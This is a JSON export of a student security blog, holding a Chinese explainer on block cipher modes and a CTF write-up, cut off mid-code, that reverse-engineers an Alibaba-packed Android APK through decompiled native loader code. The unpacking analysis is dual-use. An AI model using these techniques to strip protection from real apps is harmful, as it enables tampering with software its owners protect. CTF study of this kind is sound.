{"meta":{"title":"AssassinQ","subtitle":null,"description":"ZJGSU-IS-17","author":null,"url":"qianfei11.coding.me"},"pages":[{"title":"About","date":"2018-04-19T06:24:25.000Z","updated":"2020-02-14T04:11:33.378Z","comments":true,"path":"about/index.html","permalink":"qianfei11.coding.me/about/index.html","excerpt":"","text":"Education Time School Majar 2017-Now Zhejiang Gongshang University Information Security ContractE-Mail: assassinqkeepshumble[at]gmail.com"},{"title":"tags","date":"2018-04-19T06:24:45.000Z","updated":"2018-04-19T06:49:25.000Z","comments":true,"path":"tags/index.html","permalink":"qianfei11.coding.me/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Android Native Hook","slug":"Android-Native-Hook","date":"2020-02-27T04:50:51.000Z","updated":"2020-02-25T11:46:25.304Z","comments":true,"path":"2020/02/27/Android-Native-Hook/","link":"","permalink":"qianfei11.coding.me/2020/02/27/Android-Native-Hook/","excerpt":"Continue Reading...","text":"Enter Password and Continue Reading... ","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"android","slug":"android","permalink":"qianfei11.coding.me/tags/android/"}]},{"title":"攻防世界-MOBILE-新手练习区","slug":"攻防世界-MOBILE-新手练习区","date":"2020-02-20T11:51:47.000Z","updated":"2020-02-25T11:46:33.072Z","comments":true,"path":"2020/02/20/攻防世界-MOBILE-新手练习区/","link":"","permalink":"qianfei11.coding.me/2020/02/20/攻防世界-MOBILE-新手练习区/","excerpt":"Continue Reading...","text":"Enter Password and Continue Reading... ","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"android","slug":"android","permalink":"qianfei11.coding.me/tags/android/"}]},{"title":"分组密码的工作模式","slug":"分组密码的工作模式","date":"2020-02-17T14:30:05.000Z","updated":"2020-02-20T02:52:10.723Z","comments":true,"path":"2020/02/17/分组密码的工作模式/","link":"","permalink":"qianfei11.coding.me/2020/02/17/分组密码的工作模式/","excerpt":"复习一下密码学。","text":"复习一下密码学。 分组密码的工作模式简介密码学中，区块（block）密码的工作模式（mode of operation）允许使用同一个区块密码密钥对多于一块的数据进行加密，并保证其安全性。区块密码自身只能加密长度等于密码区块长度的单块数据，若要加密变长数据，则数据必须先被划分为一些单独的密码块。通常而言，最后一块数据也需要使用合适填充方式将数据扩展到符合密码块大小的长度。一种工作模式描述了加密每一数据块的过程，并常常使用基于一个通常称为初始化向量的附加输入值以进行随机化，以保证安全。 工作模式主要用来进行加密和认证。对加密模式的研究曾经包含数据的完整性保护，即在某些数据被修改后的情况下密码的误差传播特性。后来的研究则将完整性保护作为另一个完全不同的，与加密无关的密码学目标。部分现代的工作模式用有效的方法将加密和认证结合起来，称为认证加密模式。 虽然工作模式通常应用于对称加密，它亦可以应用于公钥加密，例如在原理上对 RSA 进行处理，但在实用中，公钥密码学通常不用于加密较长的信息，而是使用结合对称加密和公钥加密的混合加密方案。 初始化向量（IV）初始化向量（IV，Initialization Vector）是许多工作模式中用于将加密随机化的一个位块，由此即使同样的明文被多次加密也会产生不同的密文，避免了较慢的重新产生密钥的过程。 初始化向量与密钥相比有不同的安全性需求，因此 IV 通常无须保密，然而在大多数情况中，不应当在使用同一密钥的情况下两次使用同一个 IV。对于 CBC 和 CFB，重用 IV 会导致泄露明文首个块的某些信息，亦包括两个不同消息中相同的前缀。对于 OFB 和 CTR 而言，重用 IV 会导致完全失去安全性。另外，在 CBC 模式中，IV 在加密时必须是无法预测的；特别的，在许多实现中使用的产生 IV 的方法，例如 SSL2.0 使用的，即采用上一个消息的最后一块密文作为下一个消息的 IV，是不安全的。 填充（padding）块密码只能对确定长度的数据块进行处理，而消息的长度通常是可变的。因此部分模式（即 ECB 和 CBC）需要最后一块在加密前进行填充。有数种填充方法，其中最简单的一种是在明文的最后填充空字符以使其长度为块长度的整数倍，但必须保证可以恢复明文的原始长度；例如，若明文是 C 语言风格的字符串，则只有串尾会有空字符。稍微复杂一点的方法则是原始的 DES 使用的方法，即在数据后添加一个 1 位，再添加足够的 0 位直到满足块长度的要求；若消息长度刚好符合块长度，则添加一个填充块。最复杂的则是针对 CBC 的方法，例如密文窃取，残块终结等，不会产生额外的密文，但会增加一些复杂度。布鲁斯·施奈尔和尼尔斯·弗格森提出了两种简单的可能性：添加一个值为 128 的字节（十六进制的 80），再以 0 字节填满最后一个块；或向最后一个块填充 n 个值均为 n 的字节。 CFB，OFB 和 CTR 模式不需要对长度不为密码块大小整数倍的消息进行特别的处理。因为这些模式是通过对块密码的输出与明文进行异或工作的。最后一个明文块（可能是不完整的）与密钥流块的前几个字节异或后，产生了与该明文块大小相同的密文块。流密码的这个特性使得它们可以应用在需要密文和明文数据长度严格相等的场合，也可以应用在以流形式传输数据而不便于进行填充的场合。 常用模式电子密码本（ECB）最简单的加密模式即为电子密码本（Electronic codebook，ECB）模式。需要加密的消息按照块密码的块大小被分为数个块，并对每个块进行独立加密。 ECB 的缺点在于同样的明文块会被加密成相同的密文块，因此它不能很好的隐藏数据模式。在某些场合，这种方法不能提供严格的数据保密性，因此并不推荐用于密码协议中。 ECB 模式也会导致使用它的协议不能提供数据完整性保护，易受到重放攻击的影响，因此每个块是以完全相同的方式解密的。例如，“梦幻之星在线：蓝色脉冲”在线电子游戏使用 ECB 模式的 Blowfish 密码。在密钥交换系统被破解而产生更简单的破解方式前，作弊者重复通过发送加密的“杀死怪物”消息包以非法的快速增加经验值。 密码块链接（CBC）1976 年，IBM 发明了密码分组链接（CBC，Cipher-block chaining）模式。在 CBC 模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。 若第一个块的下标为 1，则 CBC 模式的加密过程如下： $$C_i = E_K(P_i \\oplus IV) \\\\IV = C_i$$ 其解密过程如下： $$P_i = D_K(C_i) \\oplus IV \\\\IV = C_i$$ CBC 是最为常用的工作模式。它的主要缺点在于加密过程是串行的，无法被并行化，而且消息必须被填充到块大小的整数倍。解决后一个问题的一种方法是利用密文窃取。 注意在加密时，明文中的微小改变会导致其后的全部密文块发生改变，而在解密时，从两个邻接的密文块中即可得到一个明文块。因此，解密过程可以被并行化，而解密时，密文中一位的改变只会导致其对应的明文块完全改变和下一个明文块中对应位发生改变，不会影响到其它明文的内容。 填充密码块链接（PCBC）填充密码块链接（PCBC，Propagating cipher-block chaining）或称为明文密码块链接（Plaintext cipher-block chaining），是一种可以使密文中的微小更改在解密时导致明文大部分错误的模式，并在加密的时候也具有同样的特性。 PCBC 的加密过程如下： $$C_i = E_K(P_i \\oplus IV) \\\\IV = P_i \\oplus C_i$$ 其解密过程如下： $$P_i = D_K(C_i) \\oplus IV \\\\IV = P_i \\oplus C_i$$ PCBC 主要用于 Kerberos v4 和 WASTE 中，而在其它场合的应用较少。对于使用 PCBC 加密的消息，互换两个邻接的密文块不会对后续块的解密造成影响。正因为这个特性，Kerberos v5 没有使用 PCBC。 密文反馈（CFB）密文反馈（CFB，Cipher feedback）模式类似于 CBC，可以将块密码变为自同步的流密码；工作过程亦非常相似，CFB 的解密过程几乎就是颠倒的 CBC 的加密过程： $$C_i = E_K(IV \\oplus P_i) \\\\P_i = E_K(IV \\oplus C_i) \\\\IV = C_i$$ 上述公式是描述的是最简单的 CFB，在这种模式下，它的自同步特性仅仅与 CBC 相同，即若密文的一整块发生错误，CBC 和 CFB 都仍能解密大部分数据，而仅有一位数据错误。若需要在仅有了一位或一字节错误的情况下也让模式具有自同步性，必须每次只加密一位或一字节。可以将移位寄存器作为块密码的输入，以利用 CFB 的自同步性。 为了利用 CFB 制作一种自同步的，可以处理任意位情况错误的流密码，需要使用一个与块的大小相同的移位寄存器，并用 IV 将寄存器初始化。然后，将寄存器内容使用块密码加密，然后将结果的最高 $x$ 位与明文的 $x$ 进行异或，以产生密文的 $x$ 位。下一步将生成的 $x$ 位密文移入寄存器中，并对下面的 $x$ 位明文重复这一过程。解密过程与加密过程相似，以 IV 开始，对寄存器加密，将结果的高 $x$ 与密文异或，产生 $x$ 位明文，再将密文的下面 $x$ 位移入寄存器。 下式中 $S_i$ 是移位寄存器的第 $i$ 个状态，$a \\ll x$ 是指将 $a$ 移位 $x$ 位，$head(a, x)$ 是指 $a$ 的高 $x$ 位，$n$ 则是指 IV 的位数。 $$C_i = head(E_K(S_{i-1}), x) \\oplus P_i \\\\P_i = head(E_K(S_{i-1}), x) \\oplus C_i \\\\S_i = ((S_{i-1} \\ll x) + C_i) mod\\ 2^n \\\\IV = S_i$$ 若密文的 $x$ 位发生错误，则密码在移位寄存器恢复与加密时的状态相同之前，输出不正确的结果，而当寄存器状态恢复后，密码即可以重新同步，恢复正常输出，因此最多只有一块数据发生错误。 与 CBC 相似，明文的改变会影响接下来所有的密文，因此加密过程不能并行化；而同样的，与 CBC 类似，解密过程是可以并行化的。在解密时，密文中一位数据的改变仅会影响两个明文块：对应明文块中的一位数据与下一块中全部的数据，而之后的数据将恢复正常。 CFB 拥有一些 CBC 所不具备的特性，这些特性与 OFB 和 CTR 的流模式相似：只需要使用块密码进行加密操作，且消息无需进行填充（虽然密文窃取也允许数据不进行填充）。 输出反馈（OFB）输出反馈模式（Output feedback, OFB）可以将块密码变成同步的流密码。它产生密钥流的块，然后将其与明文块进行异或，得到密文。与其它流密码一样，密文中一个位的翻转会使明文中同样位置的位也产生翻转。这种特性使得许多错误校正码，例如奇偶校验位，即使在加密前计算，而在加密后进行校验也可以得出正确结果。 由于 XOR 操作的对称性，加密和解密操作是完全相同的： $$C_i = P_i \\oplus O_i \\\\P_i = C_i \\oplus O_i \\\\O_i = E_K(O_{i-1}) \\\\IV = O_i$$ 每个使用 OFB 的输出块与其前面所有的输出块相关，因此不能并行化处理。然而，由于明文和密文只在最终的异或过程中使用，因此可以事先对 IV 进行加密，最后并行的将明文或密文进行并行的异或处理。 可以利用输入全 0 的 CBC 模式产生 OFB 模式的密钥流。这种方法十分实用，因为可以利用快速的 CBC 硬件实现来加速 OFB 模式的加密过程。 计数器模式（CTR）PS：CTR 模式（Counter mode，CM）也被称为 ICM 模式（Integer Counter Mode，整数计数模式）和 SIC 模式（Segmented Integer Counter）。 与 OFB 相似，CTR 将块密码变为流密码。它通过递增一个加密计数器以产生连续的密钥流，其中，计数器可以是任意保证长时间不产生重复输出的函数，但使用一个普通的计数器是最简单和最常见的做法。使用简单的、定义好的输入函数是有争议的：批评者认为它“有意的将密码系统暴露在已知的、系统的输入会造成不必要的风险”。目前，CTR 已经被广泛的使用了，由输入函数造成的问题被认为是使用的块密码的缺陷，而非 CTR 模式本身的弱点。无论如何，有一些特别的攻击方法，例如基于使用简单计数器作为输入的硬件差错攻击。 CTR 模式的特征类似于 OFB，但它允许在解密时进行随机存取。由于加密和解密过程均可以进行并行处理，CTR 适合运用于多处理器的硬件上。 注意图中的“nonce”与其它图中的 IV（初始化向量）相同。IV、随机数和计数器均可以通过连接，相加或异或使得相同明文产生不同的密文。 Referenceshttps://en.wikipedia.org/wiki/Block_cipher_mode_of_operation","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"qianfei11.coding.me/tags/crypto/"}]},{"title":"2014-AliCTF-EvilAPK_3","slug":"2014-AliCTF-EvilAPK_3","date":"2020-02-15T11:41:35.000Z","updated":"2020-02-19T02:44:54.523Z","comments":true,"path":"2020/02/15/2014-AliCTF-EvilAPK_3/","link":"","permalink":"qianfei11.coding.me/2020/02/15/2014-AliCTF-EvilAPK_3/","excerpt":"接触了一段时间的安卓后复现一下经典的题目，具体审计还有分析的步骤不做记录。","text":"接触了一段时间的安卓后复现一下经典的题目，具体审计还有分析的步骤不做记录。 Analysis（classes.dex）这道题目是阿里 14 年出的，先导入 jadx 看看反编译后大概的内容。在 AndroidManifest.xml 中，可以看到先设置了入口点为 com.ali.mobisecenhance.StubApplication，猜测这里可能是阿里加固自己添加的一个入口，用来执行一些初始化的操作，比如解密 dex，反调试，检测模拟器等等之类的。调用完 StubApplication 后，才会调用 MainActivity： 12345678910111213141516&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.ali.tg.testapp\" android:versionCode=\"1\" android:versionName=\"1.0\"&gt; &lt;uses-sdk android:minSdkVersion=\"8\" android:targetSdkVersion=\"9\" /&gt; &lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt; &lt;uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\" /&gt; &lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\" /&gt; &lt;application android:theme=\"@style/AppTheme\" android:label=\"@string/app_name\" android:icon=\"@drawable/ic_launcher\" android:name=\"com.ali.mobisecenhance.StubApplication\" android:debuggable=\"true\" android:allowBackup=\"true\"&gt; &lt;activity android:label=\"@string/app_name\" android:name=\".MainActivity\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.MAIN\" /&gt; &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;activity android:name=\".WebViewActivity\" /&gt; &lt;/application&gt;&lt;/manifest&gt; 在反编译出来的 Java 文件中，只能找到一个 StubApplication 类，其中的函数都是在 Native 层所实现，且加载了一个 mobisec 库。一般程序中是先执行 onCreate 函数，但 attachBaseContext 函数会早于 onCreate 函数执行： 12345678910111213141516package com.ali.mobisecenhance;import android.app.Application;import android.content.Context;public class StubApplication extends Application &#123; private native void b(ClassLoader classLoader, Context context); protected native void attachBaseContext(Context context); public native void onCreate(); static &#123; System.loadLibrary(\"mobisec\"); &#125;&#125; 可以在 lib 文件夹下看到 libmobisec.so 库，同时还可以看到在 assets 文件夹中有两个 jar 文件： 12345678910111213141516171819202122232425262728293031323334353637383940$ tree ..├── AndroidManifest.xml├── META-INF│ ├── MANIFEST.MF│ ├── TEST.RSA│ └── TEST.SF├── assets│ ├── cls.jar│ └── fak.jar├── classes.dex├── lib│ ├── armeabi│ │ ├── libhack.so│ │ ├── libmobisec.so│ │ └── libtranslate.so│ ├── armeabi-v7a│ │ ├── libhack.so│ │ ├── libmobisec.so│ │ └── libtranslate.so│ └── x86│ ├── libhack.so│ ├── libmobisec.so│ └── libtranslate.so├── res│ ├── drawable-hdpi│ │ ├── android.jpg│ │ └── android1.jpg│ ├── drawable-mdpi│ │ └── ic_launcher.png│ ├── drawable-xhdpi│ │ └── ic_launcher.png│ ├── drawable-xxhdpi│ │ └── ic_launcher.png│ └── layout│ ├── activity_main.xml│ └── webviewlayout.xml└── resources.arsc12 directories, 24 files file 一下，发现是 cls.jar 是一段不可识别的数据，fak.jar 判断出来是个 zip 文件： 12345$ file cls.jarcls.jar: data$ file fak.jarfak.jar: Zip archive data, at least v?[0x314] to extract 经过以上粗略的审计，可以猜测可能是在 libmobisec.so 实现了 StubApplication 中的函数，并对 assets 文件夹下的两个文件进行操作来还原出 MainActivity 中的函数。 Analysis（libmobisec.so）打开 IDA，最先定位到 JNI_OnLoad 函数，查看一下注册了哪些函数： 12345678910111213141516171819202122232425262728signed int __fastcall JNI_OnLoad(_JavaVM *vm, int a2)&#123; const char *v2; // r2 jclass v3; // r1 signed int result; // r0 bool v5; // zf _JNIEnv *env; // [sp+4h] [bp-Ch] env = (_JNIEnv *)a2; if ( vm-&gt;functions-&gt;GetEnv(&amp;vm-&gt;functions, (void **)&amp;env, 65542) ) &#123; v2 = \"Failed to get the environment\";LABEL_5: _android_log_print(6, \"debug\", v2); return -1; &#125; v3 = env-&gt;functions-&gt;FindClass(&amp;env-&gt;functions, \"com/ali/mobisecenhance/StubApplication\");// locate class if ( !v3 ) &#123; v2 = \"failed to get class reference\"; goto LABEL_5; &#125; v5 = env-&gt;functions-&gt;RegisterNatives(&amp;env-&gt;functions, v3, (const JNINativeMethod *)gMethods, 2) == 0;// register 2 methods result = 65542; if ( !v5 ) result = -1; return result;&#125; 在 RegisterNatives 函数的参数中可以看到注册了两个函数，分别为 attachBaseContext 和 onCreate。在内存中可以找到两个函数对应的指针： 12345678.data:00054010 gMethods DCD aAttachbasecont_0 ; DATA XREF: JNI_OnLoad+44↑o.data:00054010 ; .text:off_24784↑o.data:00054010 ; &quot;attachBaseContext&quot;.data:00054014 DCD aLandroidConten_1 ; &quot;(Landroid/content/Context;)V&quot;.data:00054018 DCD sub_24D3C+1.data:0005401C DCD aOncreate ; &quot;onCreate&quot;.data:00054020 DCD aV ; &quot;()V&quot;.data:00054024 DCD sub_24498+1 因为 attachBaseContext 先于 onCreate 函数执行，这里先看一下 attachBaseContext。跟着 log 可以对函数有一个大体的了解，在一处 log 里有“enter new application”的信息，猜测可能是完成了解码进入 MainActivity。在该处上下看看可以发现一个 parse_dex 函数，很有可能是解析出真正的 dex 文件的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135int __fastcall attachBaseContext(_JNIEnv *a1, jobject *a2, jobject *a3)&#123; jobject *v3; // r8 jobject *v4; // r10 _JNIEnv *env; // r4 _JNIEnv *v6; // r1 int v7; // r2 int result; // r0 ali *v9; // r0 int v10; // r0 int v11; // r0 int v12; // r0 int v13; // r5 int v14; // r0 int v15; // r0 int v16; // r0 int v17; // r0 int v18; // r0 char *v19; // r0 int v20; // r0 int v21; // r0 void *v22; // r0 void *v23; // r8 const char *v24; // r0 const char *v25; // r5 size_t v26; // r0 int v27; // r5 int v28; // r8 int v29; // r0 int v30; // r5 const char *v31; // r2 int v32; // r0 ali *v33; // r0 int v34; // r4 unsigned __int64 v35; // r2 int v36; // [sp+8h] [bp-78h] __int64 v37; // [sp+18h] [bp-68h] char v38; // [sp+24h] [bp-5Ch] char v39; // [sp+3Ch] [bp-44h] char *v40; // [sp+4Ch] [bp-34h] char *v41; // [sp+50h] [bp-30h] v3 = a2; v4 = a3; env = a1; _android_log_print(6, \"debug\", \"in...\"); result = ali::init_classes(env, v6, v7); // init classes if ( result ) return result; v9 = (ali *)_JNIEnv::CallNonvirtualVoidMethod(env, v3, ali::ContextWrapper, dword_54128, v4); v36 = ali::NanoTime(v9); v10 = _JNIEnv::GetObjectClass(env, v3); v11 = _JNIEnv::GetMethodID(env, v10, \"getFilesDir\", \"()Ljava/io/File;\"); v12 = _JNIEnv::CallObjectMethod(env, v3, v11); v13 = v12; v14 = _JNIEnv::GetObjectClass(env, v12); v15 = _JNIEnv::GetMethodID(env, v14, \"getAbsolutePath\", \"()Ljava/lang/String;\"); v16 = _JNIEnv::CallObjectMethod(env, v13, v15); sub_247D8(&amp;v39, env, v16); if ( &amp;v39 != (char *)&amp;ali::g_filePath ) std::string::_M_assign((std::string *)&amp;ali::g_filePath, v41, v40); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v39); _android_log_print(3, \"debug\", \"global files path is %s\", dword_540E8); v17 = _JNIEnv::CallObjectMethod(env, v3, dword_541A4); if ( ali::sdk_int &lt;= 8 ) &#123; v20 = _JNIEnv::GetObjectField(env, v17, dword_5416C); sub_247D8(&amp;v38, env, v20); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v39, &amp;v38, \"/lib\"); if ( &amp;v39 != (char *)&amp;ali::g_libPath ) std::string::_M_assign((std::string *)&amp;ali::g_libPath, v41, v40); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v39); v19 = &amp;v38; &#125; else &#123; v18 = _JNIEnv::GetObjectField(env, v17, dword_54170); sub_247D8(&amp;v39, env, v18); if ( &amp;v39 != (char *)&amp;ali::g_libPath ) std::string::_M_assign((std::string *)&amp;ali::g_libPath, v41, v40); v19 = &amp;v39; &#125; std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(v19); _android_log_print(3, \"debug\", \"global native path is %s\", dword_540D0); v21 = _JNIEnv::CallObjectMethod(env, v3, dword_541B0); sub_247D8(&amp;v39, env, v21); if ( &amp;v39 != (char *)&amp;ali::g_apkPath ) std::string::_M_assign((std::string *)&amp;ali::g_apkPath, v41, v40); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v39); setenv(\"APKPATH\", (const char *)dword_540B8, 1); _android_log_print(3, \"debug\", \"global apk path is %s\", dword_540B8); sub_24A64(env, v3); v22 = (void *)_JNIEnv::CallObjectMethod(env, v4, dword_541A0); v23 = v22; if ( v22 ) &#123; v24 = env-&gt;functions-&gt;GetStringUTFChars(&amp;env-&gt;functions, v22, 0); v25 = v24; v26 = strlen(v24); std::string::_M_assign((std::string *)&amp;ali::g_pkgName, v25, &amp;v25[v26]); env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, v23, v25); &#125; v37 = 0LL; v27 = _JNIEnv::CallObjectMethod(env, v4, dword_541A8); parse_dex(env, &amp;v37); // parse dex? replace_classloader_cookie(env, v27, v37, HIDWORD(v37)); _android_log_print(3, \"debug\", \"enter new application\");// enter MainActivity? v28 = dword_54120; _JNIEnv::NewStringUTF(env, \"android.app.Application\"); v29 = _JNIEnv::CallObjectMethod(env, v27, v28); v30 = v29; if ( v29 ) &#123; v32 = _JNIEnv::GetMethodID(env, v29, \"&lt;init&gt;\", \"()V\"); dword_540A0 = _JNIEnv::NewObject(env, v30, v32); _JNIEnv::CallVoidMethod(env, dword_540A0, dword_54134, v4); _JNIEnv::DeleteLocalRef(env, v30); v31 = \"exit new application\"; &#125; else &#123; v31 = \"can't findClass realAppClass\"; &#125; v33 = (ali *)_android_log_print(3, \"debug\", v31); if ( dword_540A0 ) &#123; v33 = (ali *)env-&gt;functions-&gt;NewGlobalRef(&amp;env-&gt;functions, (jobject)dword_540A0); dword_540A0 = (int)v33; &#125; v34 = ali::NanoTime(v33); _android_log_print(3, \"debug\", \"##### attachBaseContext spent:\"); ali::PrettyDuration((ali *)(v34 - v36), v35); result = _android_log_print(3, \"debug\", \"exit attachBaseContext\"); return result;&#125; 接下来进入 parse_dex 进行分析。一开始判断了是采用了 Dalvik 模式还是 ART 模式。我的机器是 Android 4.4.4，用的是 Dalvik 模式，那就只分析一下 Dalvik 的部分。接下来对 SDK 的版本进行了判断，是否大于 SDK13。我用的机器是 SDK19，故下面应该是调用了 openWithHeader 函数。之后的部分看到是用 dlopen 打开 libdvm.so，并开始执行程序，所以就不做进一步分析。主要应该就是 openWithHeader 中的内容解析了出了 dex 文件：signed int __fastcall parse_dex(_JNIEnv *a1, __int64 *a2)&#123; int v2; // r7 const char *v3; // r1 char *v4; // r0 char *v5; // r9 unsigned __int8 *v6; // r3 int v7; // r2 int v8; // t1 int fd; // ST14_4 int v10; // r8 int v11; // r7 int v12; // r5 int v13; // r0 int v14; // r5 int v15; // r0 int v16; // r7 int v17; // r1 int v18; // r5 int (__fastcall *v19)(int, signed int); // r5 int v20; // r5 unsigned __int8 *v21; // r8 const char *v22; // r3 char *v23; // r0 char *v24; // r0 char *v25; // r6 ali::EncFile *v26; // r7 int v27; // r0 int *v28; // r0 char *v29; // r0 int v30; // r10 void *v31; // r7 int (__fastcall *v32)(unsigned __int8 *, int, signed int *); // r9 int (__fastcall *v33)(_DWORD); // r7 const char *v34; // r2 int v35; // r9 signed int v36; // r7 _DWORD *v37; // r9 _BYTE *v38; // r5 unsigned __int8 *v39; // r3 void *v40; // r0 JNINativeMethod *v41; // r0 unsigned __int8 *v42; // r3 signed int v43; // r3 _JNIEnv *v45; // [sp+8h] [bp-2A0h] __int64 *v46; // [sp+10h] [bp-298h] int v47; // [sp+24h] [bp-284h] unsigned __int8 *v48; // [sp+28h] [bp-280h] unsigned __int8 *v49; // [sp+2Ch] [bp-27Ch] void (__cdecl *v50)(const unsigned int *, jvalue *); // [sp+30h] [bp-278h] char v51; // [sp+34h] [bp-274h] signed int v52[2]; // [sp+38h] [bp-270h] char s; // [sp+40h] [bp-268h] char v54; // [sp+54h] [bp-254h] int v55; // [sp+64h] [bp-244h] int v56; // [sp+68h] [bp-240h] char v57; // [sp+6Ch] [bp-23Ch] const char *v58; // [sp+80h] [bp-228h] char v59; // [sp+84h] [bp-224h] const char *v60; // [sp+98h] [bp-210h] char v61; // [sp+9Ch] [bp-20Ch] unsigned int v62; // [sp+B0h] [bp-1F8h] char v63; // [sp+B4h] [bp-1F4h] char v64; // [sp+CCh] [bp-1DCh] int v65; // [sp+E0h] [bp-1C8h] char v66; // [sp+E4h] [bp-1C4h] char v67; // [sp+FCh] [bp-1ACh] const char *v68; // [sp+110h] [bp-198h] char v69; // [sp+114h] [bp-194h] char v70; // [sp+12Ch] [bp-17Ch] const char *v71; // [sp+140h] [bp-168h] char v72; // [sp+144h] [bp-164h] char *v73; // [sp+154h] [bp-154h] char *v74; // [sp+158h] [bp-150h] char v75; // [sp+15Ch] [bp-14Ch] char v76; // [sp+174h] [bp-134h] char v77; // [sp+18Ch] [bp-11Ch] char v78; // [sp+1A4h] [bp-104h] char v79; // [sp+1BCh] [bp-ECh] char v80; // [sp+1D4h] [bp-D4h] char v81; // [sp+1ECh] [bp-BCh] char v82; // [sp+204h] [bp-A4h] char v83; // [sp+21Ch] [bp-8Ch] char v84; // [sp+234h] [bp-74h] int v85; // [sp+244h] [bp-64h] unsigned __int8 *v86; // [sp+248h] [bp-60h] char v87; // [sp+24Ch] [bp-5Ch] char v88; // [sp+264h] [bp-44h] char *v89; // [sp+274h] [bp-34h] char *v90; // [sp+278h] [bp-30h] v45 = a1; v46 = a2; _android_log_print(3, \"debug\", \"enter parse_dex\"); if ( ali::isDalvik ) // dalvik or art &#123; v47 = 0; std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v88, &amp;ali::g_filePath, \"/cls.jar\");// locate cls.jar v25 = v90; v26 = (ali::EncFile *)operator new(0xCu); ali::EncFile::EncFile(v26, v25); v48 = 0; v49 = 0; if ( ali::sdk_int &gt; 13 ) // sdk version &gt; 13 &#123; v27 = ali::EncFile::openWithHeader(v26, &amp;v48, (unsigned int *)&amp;v47, 0x10u); v49 = v48 + 16; &#125; else // sdk version &lt;= 13 ( android 3.x ) &#123; v27 = ali::EncFile::open(v26, &amp;v49, (unsigned int *)&amp;v47); &#125; if ( v49 == (unsigned __int8 *)-1 ) &#123; v28 = (int *)_errno(v27); v29 = strerror(*v28); _android_log_print(3, \"debug\", \"mmap dex file :%s\", v29);LABEL_45: v24 = &amp;v88; goto LABEL_46; &#125; v30 = *((_DWORD *)v49 + 8); if ( ali::sdk_int &gt; 13 ) // sdk version &gt; 13 &#123; v40 = dlopen(\"libdvm.so\", 1); // open libdvm.so and start execute program v41 = (JNINativeMethod *)dlsym(v40, \"dvm_dalvik_system_DexFile\"); v50 = 0; lookup(v41, \"openDexFile\", \"([B)I\", &amp;v50); v42 = v48; *((_DWORD *)v48 + 2) = v47; *(_DWORD *)&amp;v51 = v42; ((void (*)(void))v50)(); v43 = v52[0]; *v46 = v52[0]; *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v43 + 8) + 4) + 32) = *(_DWORD *)(v43 + 16); *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v43 + 8) + 4) + 36) = v47; ali::EncFile::~EncFile(v26); operator delete((void *)v26); &#125; else // sdk version &lt;= 13 ( android 3.x ) &#123; v31 = dlopen(\"libdvm.so\", 1); v32 = (int (__fastcall *)(unsigned __int8 *, int, signed int *))dlsym(v31, \"dvmDexFileOpenPartial\"); v33 = (int (__fastcall *)(_DWORD))dlsym(v31, \"dexCreateClassLookup\"); v52[0] = 0; if ( v32(v49, v30, v52) == -1 ) &#123; v34 = \"dvmDexFileOpenPartial error\";LABEL_40: _android_log_print(3, \"debug\", v34); goto LABEL_45; &#125; v35 = *(_DWORD *)v52[0]; *(_DWORD *)(v35 + 36) = v33(*(_DWORD *)v52[0]); v36 = v52[0]; if ( !*(_DWORD *)(*(_DWORD *)v52[0] + 36) ) &#123; v34 = \"dexCreateClassLookup error\"; goto LABEL_40; &#125; v37 = malloc(0x2Cu); v38 = malloc(0x14u); strdup((const char *)&amp;unk_4CEE9); v38[4] = 0; v38[5] = 0; *((_DWORD *)v38 + 2) = 0; v39 = v49; *(_DWORD *)v38 = v38; *((_DWORD *)v38 + 3) = v37; v37[10] = v36; *(_DWORD *)(v36 + 32) = v39; *(_DWORD *)(v36 + 36) = v47; *v46 = (signed int)v38; &#125; v23 = &amp;v88; goto LABEL_44; &#125; std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v54, &amp;ali::g_filePath, \"/cls.jar\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v57, &amp;ali::g_filePath, \"/cls.dex\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v59, &amp;ali::g_filePath, \"/fak.jar\"); _android_log_print(3, \"debug\", \"before oat gen\"); if ( !access(v58, 0) ) goto LABEL_24; v2 = android_getCpuFamily(); std::string::string(&amp;v63, \"arm\", &amp;v51); switch ( v2 ) &#123; case 1: v3 = \"arm\";LABEL_5: std::string::operator=(&amp;v63, v3); break; case 2: v3 = \"x86\"; goto LABEL_5; case 3: case 6: v3 = \"mips\"; goto LABEL_5; case 4: v3 = \"arm64\"; goto LABEL_5; case 5: v3 = \"x86_64\"; goto LABEL_5; &#125; std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v64, &amp;ali::g_libPath, \"/libhack.so\"); v4 = getenv(\"LD_PRELOAD\"); v5 = v4; if ( v4 ) &#123; 